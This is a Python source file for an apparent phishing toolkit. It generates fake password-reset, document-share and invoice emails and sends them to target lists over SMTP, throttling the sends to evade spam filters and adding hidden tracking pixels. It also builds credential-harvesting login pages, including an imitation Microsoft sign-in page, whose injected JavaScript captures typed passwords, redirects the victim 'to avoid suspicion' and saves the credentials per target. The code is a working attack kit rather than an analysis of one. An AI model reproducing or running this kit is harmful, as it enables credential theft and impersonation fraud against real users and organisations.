#!/usr/bin/env python
# -*- coding: utf-8 -*-

import random
import json
import os
import time
import logging
import re
import requests
from bs4 import BeautifulSoup
from datetime import datetime
import smtplib
import uuid
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from string import Template
from urllib.parse import quote_plus, urlencode

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class SocialEngineeringToolkit:
    def __init__(self, output_dir="campaigns"):
        self.output_dir = output_dir
        self.templates_dir = os.path.join(output_dir, "templates")
        self.landing_pages_dir = os.path.join(output_dir, "landing_pages")
        self.results_dir = os.path.join(output_dir, "results")
        
        # Create necessary directories
        for directory in [self.output_dir, self.templates_dir, self.landing_pages_dir, self.results_dir]:
            if not os.path.exists(directory):
                os.makedirs(directory)
        
        # Initialize campaign tracking
        self.campaigns = {}
        self.campaign_file = os.path.join(self.output_dir, "campaigns.json")
        
        # Load existing campaigns if available
        if os.path.exists(self.campaign_file):
            try:
                with open(self.campaign_file, 'r') as f:
                    self.campaigns = json.load(f)
            except json.JSONDecodeError:
                self.campaigns = {}
    
    def _save_campaigns(self):
        """Save campaign data to file"""
        with open(self.campaign_file, 'w') as f:
            json.dump(self.campaigns, f, indent=4)
    
    def create_email_template(self, template_name, subject, body_html, sender_name="Support Team"):
        """Create a new email template for phishing campaigns"""
        template_id = str(uuid.uuid4())
        template = {
            "id": template_id,
            "name": template_name,
            "subject": subject,
            "body_html": body_html,
            "sender_name": sender_name,
            "created_at": datetime.now().isoformat()
        }
        
        # Save template to file
        template_file = os.path.join(self.templates_dir, f"{template_id}.json")
        with open(template_file, 'w') as f:
            json.dump(template, f, indent=4)
        
        return {
            "status": "success",
            "template_id": template_id,
            "template_file": template_file
        }
    
    def list_templates(self):
        """List all available email templates"""
        templates = []
        for filename in os.listdir(self.templates_dir):
            if filename.endswith(".json"):
                try:
                    with open(os.path.join(self.templates_dir, filename), 'r') as f:
                        template = json.load(f)
                        templates.append({
                            "id": template["id"],
                            "name": template["name"],
                            "subject": template["subject"],
                            "created_at": template["created_at"]
                        })
                except (json.JSONDecodeError, KeyError):
                    pass
        
        return templates
    
    def get_template(self, template_id):
        """Get a specific email template"""
        template_file = os.path.join(self.templates_dir, f"{template_id}.json")
        if os.path.exists(template_file):
            with open(template_file, 'r') as f:
                return json.load(f)
        return None
    
    def _personalize_email(self, template, target_data):
        """Personalize an email template with target-specific data"""
        # Create a Template object from the HTML body
        body_template = Template(template["body_html"])
        
        # Replace placeholders with actual data
        personalized_body = body_template.safe_substitute(**target_data)
        
        # Create a personalized subject if it contains placeholders
        subject_template = Template(template["subject"])
        personalized_subject = subject_template.safe_substitute(**target_data)
        
        return personalized_subject, personalized_body
    
    def create_landing_page(self, page_name, html_content, success_redirect=None, javascript=None):
        """Create a landing page for credential harvesting"""
        page_id = str(uuid.uuid4())
        
        # Add credential harvesting code if not already present
        if "<form" in html_content and "method=" in html_content and not "id='credential-form'" in html_content:
            # Add form ID and JavaScript to capture credentials
            html_content = html_content.replace("<form", "<form id='credential-form'")
        
        # Add default JavaScript for credential handling if not provided
        if not javascript:
            javascript = """
            document.addEventListener('DOMContentLoaded', function() {
                const form = document.getElementById('credential-form');
                if (form) {
                    form.addEventListener('submit', function(e) {
                        e.preventDefault();
                        
                        // Collect form data
                        const formData = new FormData(form);
                        const data = {};
                        for (let [key, value] of formData.entries()) {
                            data[key] = value;
                        }
                        
                        // Send data via fetch
                        fetch('/submit-credentials', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify(data),
                        })
                        .then(response => response.json())
                        .then(data => {
                            // Redirect after successful submission
                            window.location.href = '${success_redirect}';
                        })
                        .catch(error => {
                            console.error('Error:', error);
                            // Still redirect to avoid suspicion
                            window.location.href = '${success_redirect}';
                        });
                    });
                }
            });
            """
        
        # Insert JavaScript into HTML content
        if '<head>' in html_content and javascript:
            html_content = html_content.replace('</head>', f'<script>{javascript}</script></head>')
        elif javascript:
            html_content = f'<script>{javascript}</script>\n{html_content}'
        
        # Replace success_redirect placeholder
        if success_redirect:
            html_content = html_content.replace('${success_redirect}', success_redirect)
        
        landing_page = {
            "id": page_id,
            "name": page_name,
            "html_content": html_content,
            "success_redirect": success_redirect,
            "created_at": datetime.now().isoformat()
        }
        
        # Save landing page to file
        page_file = os.path.join(self.landing_pages_dir, f"{page_id}.json")
        with open(page_file, 'w') as f:
            json.dump(landing_page, f, indent=4)
        
        # Also save HTML file for easy viewing
        html_file = os.path.join(self.landing_pages_dir, f"{page_id}.html")
        with open(html_file, 'w') as f:
            f.write(html_content)
        
        return {
            "status": "success",
            "page_id": page_id,
            "page_file": page_file,
            "html_file": html_file
        }
    
    def list_landing_pages(self):
        """List all available landing pages"""
        pages = []
        for filename in os.listdir(self.landing_pages_dir):
            if filename.endswith(".json"):
                try:
                    with open(os.path.join(self.landing_pages_dir, filename), 'r') as f:
                        page = json.load(f)
                        pages.append({
                            "id": page["id"],
                            "name": page["name"],
                            "created_at": page["created_at"]
                        })
                except (json.JSONDecodeError, KeyError):
                    pass
        
        return pages
    
    def get_landing_page(self, page_id):
        """Get a specific landing page"""
        page_file = os.path.join(self.landing_pages_dir, f"{page_id}.json")
        if os.path.exists(page_file):
            with open(page_file, 'r') as f:
                return json.load(f)
        return None
    
    def create_campaign(self, name, template_id=None, landing_page_id=None, targets=None, tracking_url=None):
        """Create a new phishing campaign"""
        campaign_id = str(uuid.uuid4())
        
        campaign = {
            "id": campaign_id,
            "name": name,
            "template_id": template_id,
            "landing_page_id": landing_page_id,
            "tracking_url": tracking_url or f"https://example.com/track/{campaign_id}",
            "targets": targets or [],
            "results": {
                "emails_sent": 0,
                "opened": [],
                "clicked": [],
                "submitted": []
            },
            "status": "created",
            "created_at": datetime.now().isoformat(),
            "updated_at": datetime.now().isoformat()
        }
        
        # Save campaign
        self.campaigns[campaign_id] = campaign
        self._save_campaigns()
        
        # Create campaign-specific results directory
        campaign_dir = os.path.join(self.results_dir, campaign_id)
        if not os.path.exists(campaign_dir):
            os.makedirs(campaign_dir)
        
        return {
            "status": "success",
            "campaign_id": campaign_id,
            "campaign": campaign
        }
    
    def add_targets_to_campaign(self, campaign_id, targets):
        """Add targets to an existing campaign"""
        if campaign_id not in self.campaigns:
            return {"status": "error", "message": "Campaign not found"}
        
        campaign = self.campaigns[campaign_id]
        current_targets = set([t["email"] for t in campaign["targets"]])
        
        # Add new targets
        for target in targets:
            if "email" not in target:
                continue
                
            if target["email"] not in current_targets:
                # Generate a unique tracking ID for this target
                target["tracking_id"] = str(uuid.uuid4())
                campaign["targets"].append(target)
                current_targets.add(target["email"])
        
        campaign["updated_at"] = datetime.now().isoformat()
        self._save_campaigns()
        
        return {
            "status": "success",
            "campaign_id": campaign_id,
            "target_count": len(campaign["targets"])
        }
    
    def launch_campaign(self, campaign_id, smtp_config=None):
        """Launch a phishing campaign by sending emails to all targets"""
        if campaign_id not in self.campaigns:
            return {"status": "error", "message": "Campaign not found"}
        
        campaign = self.campaigns[campaign_id]
        
        # Check if template exists
        if not campaign["template_id"]:
            return {"status": "error", "message": "No email template assigned to campaign"}
            
        template = self.get_template(campaign["template_id"])
        if not template:
            return {"status": "error", "message": "Email template not found"}
        
        # Set campaign status to "in_progress"
        campaign["status"] = "in_progress"
        campaign["launch_time"] = datetime.now().isoformat()
        self._save_campaigns()
        
        # For safety, don't actually send emails unless explicitly configured
        if not smtp_config or "simulation_mode" in smtp_config:
            return {
                "status": "simulated",
                "message": "Campaign launched in simulation mode - no emails sent",
                "campaign_id": campaign_id,
                "target_count": len(campaign["targets"])
            }
        
        # SMTP configuration
        smtp_server = smtp_config.get("server", "localhost")
        smtp_port = smtp_config.get("port", 25)
        smtp_user = smtp_config.get("username")
        smtp_password = smtp_config.get("password")
        from_email = smtp_config.get("from_email", "noreply@example.com")
        
        # Try to send emails
        try:
            # Connect to SMTP server
            server = smtplib.SMTP(smtp_server, smtp_port)
            server.ehlo()
            if smtp_port == 587:
                server.starttls()
                server.ehlo()
            if smtp_user and smtp_password:
                server.login(smtp_user, smtp_password)
            
            sent_count = 0
            
            # Iterate through targets and send personalized emails
            for target in campaign["targets"]:
                # Skip if already sent
                if "email_sent" in target and target["email_sent"]:
                    continue
                
                # Personalize the email
                personalized_subject, personalized_body = self._personalize_email(template, target)
                
                # Add tracking pixel if tracking URL is provided
                if campaign["tracking_url"]:
                    tracking_pixel = f'<img src="{campaign["tracking_url"]}?tid={target["tracking_id"]}" style="display:none" width="1" height="1" />'
                    if '</body>' in personalized_body:
                        personalized_body = personalized_body.replace('</body>', f'{tracking_pixel}</body>')
                    else:
                        personalized_body += tracking_pixel
                
                # Create message
                msg = MIMEMultipart('alternative')
                msg['Subject'] = personalized_subject
                msg['From'] = f"{template['sender_name']} <{from_email}>"
                msg['To'] = target["email"]
                
                # Attach HTML content
                part = MIMEText(personalized_body, 'html')
                msg.attach(part)
                
                # Send email
                server.sendmail(from_email, target["email"], msg.as_string())
                
                # Mark as sent
                target["email_sent"] = True
                target["sent_time"] = datetime.now().isoformat()
                sent_count += 1
                
                # Sleep to avoid triggering spam detection
                time.sleep(random.uniform(1, 3))
            
            # Close SMTP connection
            server.quit()
            
            # Update campaign stats
            campaign["results"]["emails_sent"] = sent_count
            campaign["updated_at"] = datetime.now().isoformat()
            self._save_campaigns()
            
            return {
                "status": "success",
                "message": f"Campaign launched successfully - {sent_count} emails sent",
                "campaign_id": campaign_id,
                "emails_sent": sent_count
            }
            
        except Exception as e:
            campaign["status"] = "error"
            campaign["error_message"] = str(e)
            campaign["updated_at"] = datetime.now().isoformat()
            self._save_campaigns()
            
            return {
                "status": "error",
                "message": f"Error launching campaign: {str(e)}",
                "campaign_id": campaign_id
            }
    
    def track_email_open(self, tracking_id):
        """Track when an email is opened via tracking pixel"""
        for campaign_id, campaign in self.campaigns.items():
            for target in campaign["targets"]:
                if "tracking_id" in target and target["tracking_id"] == tracking_id:
                    if tracking_id not in campaign["results"]["opened"]:
                        campaign["results"]["opened"].append(tracking_id)
                        target["opened_time"] = datetime.now().isoformat()
                        self._save_campaigns()
                    return True
        return False
    
    def track_link_click(self, tracking_id, link_id=None):
        """Track when a link in the email is clicked"""
        for campaign_id, campaign in self.campaigns.items():
            for target in campaign["targets"]:
                if "tracking_id" in target and target["tracking_id"] == tracking_id:
                    if tracking_id not in campaign["results"]["clicked"]:
                        campaign["results"]["clicked"].append(tracking_id)
                        target["clicked_time"] = datetime.now().isoformat()
                        if link_id:
                            target["clicked_link"] = link_id
                        self._save_campaigns()
                    return True
        return False
    
    def record_credentials(self, tracking_id, credentials):
        """Record harvested credentials"""
        for campaign_id, campaign in self.campaigns.items():
            for target in campaign["targets"]:
                if "tracking_id" in target and target["tracking_id"] == tracking_id:
                    if tracking_id not in campaign["results"]["submitted"]:
                        campaign["results"]["submitted"].append(tracking_id)
                    
                    target["submitted_time"] = datetime.now().isoformat()
                    target["credentials"] = credentials
                    
                    # Save to campaign-specific results file
                    campaign_dir = os.path.join(self.results_dir, campaign_id)
                    if not os.path.exists(campaign_dir):
                        os.makedirs(campaign_dir)
                    
                    creds_file = os.path.join(campaign_dir, f"{tracking_id}_credentials.json")
                    with open(creds_file, 'w') as f:
                        json.dump({
                            "tracking_id": tracking_id,
                            "target": target["email"],
                            "timestamp": datetime.now().isoformat(),
                            "credentials": credentials
                        }, f, indent=4)
                    
                    self._save_campaigns()
                    return True
        return False
    
    def get_campaign_stats(self, campaign_id):
        """Get detailed statistics for a campaign"""
        if campaign_id not in self.campaigns:
            return {"status": "error", "message": "Campaign not found"}
        
        campaign = self.campaigns[campaign_id]
        
        # Calculate statistics
        total_targets = len(campaign["targets"])
        emails_sent = campaign["results"]["emails_sent"]
        opens = len(campaign["results"]["opened"])
        clicks = len(campaign["results"]["clicked"])
        submissions = len(campaign["results"]["submitted"])
        
        # Calculate rates
        open_rate = (opens / emails_sent) * 100 if emails_sent > 0 else 0
        click_rate = (clicks / opens) * 100 if opens > 0 else 0
        submission_rate = (submissions / clicks) * 100 if clicks > 0 else 0
        success_rate = (submissions / emails_sent) * 100 if emails_sent > 0 else 0
        
        stats = {
            "campaign_id": campaign_id,
            "name": campaign["name"],
            "status": campaign["status"],
            "created_at": campaign["created_at"],
            "total_targets": total_targets,
            "emails_sent": emails_sent,
            "opens": opens,
            "clicks": clicks,
            "submissions": submissions,
            "rates": {
                "open_rate": round(open_rate, 2),
                "click_rate": round(click_rate, 2),
                "submission_rate": round(submission_rate, 2),
                "success_rate": round(success_rate, 2)
            }
        }
        
        return stats
    
    def list_campaigns(self):
        """List all campaigns with basic statistics"""
        campaign_list = []
        for campaign_id, campaign in self.campaigns.items():
            campaign_list.append({
                "id": campaign_id,
                "name": campaign["name"],
                "status": campaign["status"],
                "created_at": campaign["created_at"],
                "targets": len(campaign["targets"]),
                "emails_sent": campaign["results"]["emails_sent"],
                "opens": len(campaign["results"]["opened"]),
                "clicks": len(campaign["results"]["clicked"]),
                "submissions": len(campaign["results"]["submitted"])
            })
        
        return campaign_list
    
    def export_campaign_results(self, campaign_id, format="json"):
        """Export detailed campaign results"""
        if campaign_id not in self.campaigns:
            return {"status": "error", "message": "Campaign not found"}
        
        campaign = self.campaigns[campaign_id]
        
        # Create export data
        export_data = {
            "campaign": {
                "id": campaign_id,
                "name": campaign["name"],
                "status": campaign["status"],
                "created_at": campaign["created_at"],
                "template_id": campaign["template_id"],
                "landing_page_id": campaign["landing_page_id"]
            },
            "statistics": self.get_campaign_stats(campaign_id),
            "targets": campaign["targets"]
        }
        
        # Export to file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        export_file = os.path.join(self.results_dir, f"campaign_{campaign_id}_{timestamp}.json")
        
        with open(export_file, 'w') as f:
            json.dump(export_data, f, indent=4)
        
        return {
            "status": "success",
            "file": export_file,
            "format": format
        }
    
    def generate_common_templates(self):
        """Generate common phishing email templates"""
        templates = []
        
        # Password Reset Template
        password_reset_html = """
        <html>
        <head>
            <style>
                body { font-family: Arial, sans-serif; }
                .header { background-color: #0078D4; color: white; padding: 10px; }
                .content { padding: 20px; }
                .button { background-color: #0078D4; color: white; padding: 10px 20px; 
                          text-decoration: none; border-radius: 4px; }
            </style>
        </head>
        <body>
            <div class="header">
                <h2>${company_name} Security</h2>
            </div>
            <div class="content">
                <p>Dear ${first_name},</p>
                <p>We detected a recent login attempt to your ${company_name} account from an unrecognized device.</p>
                <p>If this was not you, your password may be compromised. Please reset your password immediately by clicking the button below:</p>
                <p><a href="${phishing_url}?tid=${tracking_id}" class="button">Reset Password</a></p>
                <p>If you did not request this change, please ignore this email and your password will remain unchanged.</p>
                <p>Thank you,<br>
                ${company_name} Security Team</p>
            </div>
        </body>
        </html>
        """
        
        password_template = self.create_email_template(
            "Password Reset Alert",
            "Security Alert: Reset Your ${company_name} Password",
            password_reset_html,
            "Security Team"
        )
        templates.append(password_template)
        
        # Document Share Template
        document_share_html = """
        <html>
        <head>
            <style>
                body { font-family: Arial, sans-serif; }
                .header { background-color: #185ABD; color: white; padding: 10px; }
                .content { padding: 20px; }
                .button { background-color: #185ABD; color: white; padding: 10px 20px; 
                          text-decoration: none; border-radius: 4px; }
                .footer { font-size: 12px; color: #666; margin-top: 30px; }
            </style>
        </head>
        <body>
            <div class="header">
                <h2>${company_name} Document Sharing</h2>
            </div>
            <div class="content">
                <p>Hi ${first_name},</p>
                <p>A document has been shared with you by ${sender_name} (${sender_email}).</p>
                <p><strong>Document name:</strong> ${document_name}</p>
                <p>You can access this document by clicking the button below:</p>
                <p><a href="${phishing_url}?tid=${tracking_id}" class="button">View Document</a></p>
                <p>This link will expire in 7 days.</p>
                <p>Best regards,<br>
                ${company_name} Team</p>
                <div class="footer">
                    This email was sent by the ${company_name} automatic notification system. Please do not reply to this email.
                </div>
            </div>
        </body>
        </html>
        """
        
        document_template = self.create_email_template(
            "Document Sharing",
            "${sender_name} shared a document with you: ${document_name}",
            document_share_html,
            "Document Sharing"
        )
        templates.append(document_template)
        
        # Invoice Template
        invoice_html = """
        <html>
        <head>
            <style>
                body { font-family: Arial, sans-serif; }
                .header { background-color: #2E7D32; color: white; padding: 10px; }
                .content { padding: 20px; }
                .button { background-color: #2E7D32; color: white; padding: 10px 20px; 
                          text-decoration: none; border-radius: 4px; }
                .details { background-color: #f5f5f5; padding: 10px; margin: 15px 0; }
            </style>
        </head>
        <body>
            <div class="header">
                <h2>${company_name} Billing</h2>
            </div>
            <div class="content">
                <p>Dear ${first_name},</p>
                <p>Your invoice #${invoice_number} for ${amount} is now available.</p>
                <div class="details">
                    <p><strong>Invoice #:</strong> ${invoice_number}</p>
                    <p><strong>Date:</strong> ${invoice_date}</p>
                    <p><strong>Amount:</strong> ${amount}</p>
                    <p><strong>Due Date:</strong> ${due_date}</p>
                </div>
                <p>Please review and process this payment by clicking the button below:</p>
                <p><a href="${phishing_url}?tid=${tracking_id}" class="button">View and Pay Invoice</a></p>
                <p>Thank you for your business,<br>
                ${company_name} Billing Team</p>
            </div>
        </body>
        </html>
        """
        
        invoice_template = self.create_email_template(
            "Invoice Payment",
            "Invoice #${invoice_number} from ${company_name} - Payment Required",
            invoice_html,
            "Billing Team"
        )
        templates.append(invoice_template)
        
        return {
            "status": "success",
            "templates_created": len(templates),
            "templates": templates
        }
    
    def generate_landing_pages(self):
        """Generate common phishing landing pages"""
        landing_pages = []
        
        # Generic Login Page
        login_html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Login to Continue</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background-color: #f5f5f5;
                    margin: 0;
                    padding: 0;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                }
                .login-container {
                    background-color: white;
                    border-radius: 8px;
                    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
                    padding: 30px;
                    width: 350px;
                }
                .header {
                    text-align: center;
                    margin-bottom: 30px;
                }
                .header img {
                    max-height: 60px;
                    margin-bottom: 10px;
                }
                h2 {
                    color: #333;
                    margin: 0;
                }
                .form-group {
                    margin-bottom: 20px;
                }
                label {
                    display: block;
                    margin-bottom: 5px;
                    color: #555;
                }
                input[type="email"],
                input[type="password"] {
                    width: 100%;
                    padding: 10px;
                    border: 1px solid #ddd;
                    border-radius: 4px;
                    box-sizing: border-box;
                }
                button {
                    width: 100%;
                    padding: 12px;
                    background-color: #0078D4;
                    color: white;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                    font-size: 16px;
                }
                .footer {
                    text-align: center;
                    margin-top: 20px;
                    font-size: 14px;
                    color: #777;
                }
            </style>
        </head>
        <body>
            <div class="login-container">
                <div class="header">
                    <img src="https://via.placeholder.com/200x60?text=Company+Logo" alt="Company Logo">
                    <h2>Sign in to continue</h2>
                </div>
                
                <form id="credential-form">
                    <div class="form-group">
                        <label for="email">Email</label>
                        <input type="email" id="email" name="email" required autofocus>
                    </div>
                    
                    <div class="form-group">
                        <label for="password">Password</label>
                        <input type="password" id="password" name="password" required>
                    </div>
                    
                    <button type="submit">Sign In</button>
                </form>
                
                <div class="footer">
                    &copy; 2023 Company Name. All rights reserved.
                </div>
            </div>
        </body>
        </html>
        """
        
        login_page = self.create_landing_page(
            "Generic Login Page",
            login_html,
            "https://example.com"
        )
        landing_pages.append(login_page)
        
        # Office 365 Login Page
        office365_html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Sign in to your account</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body {
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    background-color: #f2f2f2;
                    margin: 0;
                    padding: 0;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                }
                .login-container {
                    background-color: white;
                    border-radius: 4px;
                    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
                    padding: 44px;
                    width: 338px;
                }
                .header {
                    margin-bottom: 30px;
                }
                .header img {
                    height: 24px;
                    margin-bottom: 16px;
                }
                h1 {
                    color: #333;
                    font-size: 24px;
                    font-weight: 600;
                    margin: 0;
                    margin-bottom: 12px;
                }
                .subtitle {
                    font-size: 13px;
                    margin-bottom: 24px;
                }
                .form-group {
                    margin-bottom: 20px;
                }
                input[type="email"],
                input[type="password"] {
                    width: 100%;
                    padding: 6px 10px;
                    border: 1px solid #666;
                    border-radius: 2px;
                    box-sizing: border-box;
                    font-size: 15px;
                    height: 36px;
                }
                button {
                    width: 100%;
                    padding: 4px 12px;
                    background-color: #0067b8;
                    color: white;
                    border: none;
                    border-radius: 0;
                    cursor: pointer;
                    font-size: 15px;
                    height: 36px;
                    margin-top: 24px;
                }
                .footer {
                    font-size: 13px;
                    color: #0067b8;
                    margin-top: 16px;
                    text-align: left;
                }
                .footer a {
                    color: #0067b8;
                    text-decoration: none;
                }
            </style>
        </head>
        <body>
            <div class="login-container">
                <div class="header">
                    <img src="https://via.placeholder.com/100x24?text=Microsoft" alt="Microsoft">
                    <h1>Sign in</h1>
                    <div class="subtitle" id="displayName"></div>
                </div>
                
                <form id="credential-form">
                    <div class="form-group">
                        <input type="email" id="email" name="email" placeholder="Email, phone, or Skype" required autofocus>
                    </div>
                    
                    <div class="form-group">
                        <input type="password" id="password" name="password" placeholder="Password" required>
                    </div>
                    
                    <button type="submit">Sign in</button>
                </form>
                
                <div class="footer">
                    <a href="#">Can't access your account?</a>
                </div>
            </div>
            
            <script>
                // Display email in subtitle if provided in URL
                document.addEventListener('DOMContentLoaded', function() {
                    const urlParams = new URLSearchParams(window.location.search);
                    const email = urlParams.get('email');
                    if (email) {
                        document.getElementById('email').value = email;
                        document.getElementById('displayName').textContent = email;
                    }
                });
            </script>
        </body>
        </html>
        """
        
        office365_page = self.create_landing_page(
            "Office 365 Login Page",
            office365_html,
            "https://office.com"
        )
        landing_pages.append(office365_page)
        
        return {
            "status": "success",
            "landing_pages_created": len(landing_pages),
            "landing_pages": landing_pages
        }

# Example usage
if __name__ == "__main__":
    se_toolkit = SocialEngineeringToolkit()
    
    # Generate example templates and landing pages
    templates = se_toolkit.generate_common_templates()
    landing_pages = se_toolkit.generate_landing_pages()
    
    print(f"Created {templates['templates_created']} email templates and {landing_pages['landing_pages_created']} landing pages") 